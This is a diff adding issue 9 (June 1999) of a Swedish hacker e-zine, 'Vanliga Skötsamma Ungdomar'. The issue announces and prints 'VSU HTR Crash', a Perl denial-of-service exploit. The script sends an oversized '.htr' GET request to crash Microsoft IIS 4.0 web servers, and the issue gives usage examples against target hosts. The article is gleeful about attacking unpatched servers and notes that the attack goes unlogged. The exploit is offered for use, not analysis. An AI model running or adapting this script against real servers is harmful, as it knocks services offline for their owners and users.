@@ -1,0 +1,162 @@
+                       _    __            ___
+                      | |  / /___ _____  / (_)___ _____ _
+                      | | / / __ `/ __ \/ / / __ `/ __ `/
+                      | |/ / /_/ / / / / / / /_/ / /_/ /
+                      |___/\__,_/_/ /_/_/_/\__, /\__,_/
+                                          /____/
+             _____ __   _   _ __
+            / ___// /__(_)_(_) /__________ _____ ___  ____ ___  ____ _
+            \__ \/ //_/ __ \/ __/ ___/ __ `/ __ `__ \/ __ `__ \/ __ `/
+           ___/ / ,< / /_/ / /_(__  ) /_/ / / / / / / / / / / / /_/ /
+          /____/_/|_|\____/\__/____/\__,_/_/ /_/ /_/_/ /_/ /_/\__,_/
+
+                __  __                __
+               / / / /___  ____ _____/ /___  ____ ___  ____ ______
+              / / / / __ \/ __ `/ __  / __ \/ __ `__ \/ __ `/ ___/
+             / /_/ / / / / /_/ / /_/ / /_/ / / / / / / /_/ / /
+             \____/_/ /_/\__, /\__,_/\____/_/ /_/ /_/\__,_/_/
+                        /____/
+
+                VANLIGA SKÖTSAMMA UNGDOMAR NUMMER 9 - JUNI 1999
+
+           "sommaren är kort / det mesta regnar bort"   -- Vergilius
+
+
+Antal prenumeranter
+-=================-
+
+runt 370
+
+
+Officiell emailadress till VSU-redaktionen
+-========================================-
+
+harnhammar@yahoo.com
+
+
+Ladda ner gamla nummer av VSU
+-===========================-
+
+http://welcome.to/Zineworld
+http://c5.hakker.com/magazines/
+.. och sådär en 11 andra websidor där ute på Informationsmotorvägen.
+
+
+Medverkande skribenter i detta nummer
+-===================================-
+
+Ulf
+
+
+------------------------------------------------------------------------------
+
+
+VSU HTR CRASH v1.0
+-================-
+
+
+Nu kan du både krascha och ta över IIS4.0-webservrar som körs under
+Windows NT 4.0! Det är den näst vanligaste typen av webservrar på nätet
+efter Apache - speciellt många stora företag som är för uppstyltade och
+hämmade för att våga använda Linux och Apache kör IIS!
+
+eEye Digital Security Team (http://www.eeye.com/) postade nyligen ett
+inlägg om detta på den säkerhetsinriktade mailinglistan Bugtraq.
+IIS-webservrarna har en buffer overflow-bug i sin hantering av en speciell
+typ av filer vars namn slutar på ".htr". Det enda man behöver göra är att
+skicka en vanlig GET-request till webservern, för ett extremt långt
+filnamn som slutar på ".htr". Då kan man ta över webservern (om man kan
+koda assembler under Windows NT) eller krascha den.
+
+För att göra det hela ännu värre så (1) loggar inte webservern vem som har
+angripit den, och (2) Microsoft har inte någon patch för denna bug färdig
+ännu.
+
+Detta tyckte ju vi verkade vara roligt, så vi kodade minsann ett eget Perl
+5-skript för att krascha sådana webservrar. Du installerar skriptet genom
+att ändra första raden så att den pekar på Perl 5-tolken på ditt system,
+och sedan ändrar du skriptets accessrättigheter så att det blir körbart.
+
+Du använder vårt skript så här:
+
+./vsu_htr_crash www.0ffer.com
+(om webservern svarar på port 80, som de flesta webservrar gör)
+
+eller:
+./vsu_htr_crash www.ett-annat-0ffer.nu 8080
+(om den istället svarar på port 8080)
+
+Så var det med det! Glöm inte bort att köpa Jan Svenssons nya bok "S.H.A.
+- Hackergruppen som skakade Sverige" (Kentaur Bokförlag), som berättar mer
+om denna hemlighetsfulla gamla grupp.
+
+Jag har fått in väldigt dåligt med material till VSU#10, så skriv gärna
+artiklar åt VSU och skicka in dem till mig. Hittills har jag tagit med
+nästan allt material som folk har skickat in.
+
+Solen skiner. Dags att stänga av datorn och gå ut.
+
+
+// Ulf of VSU
+
+
+
+#!/usr/bin/perl --
+# VSU HTR Crash v1.0
+# (?) Copywrong 1999 Vanliga Skötsamma Ungdomar
+# Kodad av Ulf of VSU den 16:e juni 1999
+# Buggen funnen av eEye Digital Security Team
+
+use Socket;
+
+# 0.0 INITIALISERING OCH INSTRUKTIONER
+
+print "VSU HTR Crash v1.0\n".
+      "(?) Copywrong 1999 Vanliga Skötsamma Ungdomar\n".
+      "Kodad av Ulf of VSU den 16:e juni 1999\n".
+      "Buggen funnen av eEye Digital Security Team\n\n";
+
+if (($#ARGV < 0) || ($#ARGV > 1) || ($ARGV[0] eq "-h") ||
+    ($ARGV[0] eq "--help") || ($ARGV[0] eq "-?"))
+{ print "Användning:  $0 server [portnr]\n"; exit; }
+
+$| = 1; $crlf = "\015\012";
+
+($machine, $port) = @ARGV; $bugstr = "a" x 3800;
+if ($port eq "") { $port = 80; }
+
+$http = "GET /$bugstr.htr HTTP/1.1$crlf".
+        "Host: $machine$crlf".
+        "User-Agent: Mozilla/4.05 [en] (Win95; I)$crlf".
+        "Connection: close$crlf$crlf";
+
+# 1.0 UPPKOPPLING MOT WEBSERVERN
+
+$tcp = getprotobyname("tcp");
+socket(SOK, PF_INET, SOCK_STREAM, $tcp) or die "Socketfel!\n";
+
+print "Söker...";
+$numb = inet_aton($machine) or die " hittar den inte!\n";
+
+$con = sockaddr_in($port, $numb);
+
+print " ok\nKopplar upp...";
+connect(SOK, $con) or die " går inte mot denna port!\n";
+
+# 2.0 SKICKAR DEN 0NDA HTTP-REQUESTEN
+
+select SOK; $| = 1; select STDOUT; print " ok\nSkickar dödsstöten...";
+print SOK $http;
+
+# 3.0 VISAR VAD WEBSERVERN EVENTUELLT SKICKAR TILLBAKS
+
+print "\n";
+print while <SOK>;
+close SOK or die "\nSocketfel!\n";
+
+print "\nKlart!\n";
+
+
+# VSU 1999 - Stil, Bildning och Moral
+
+
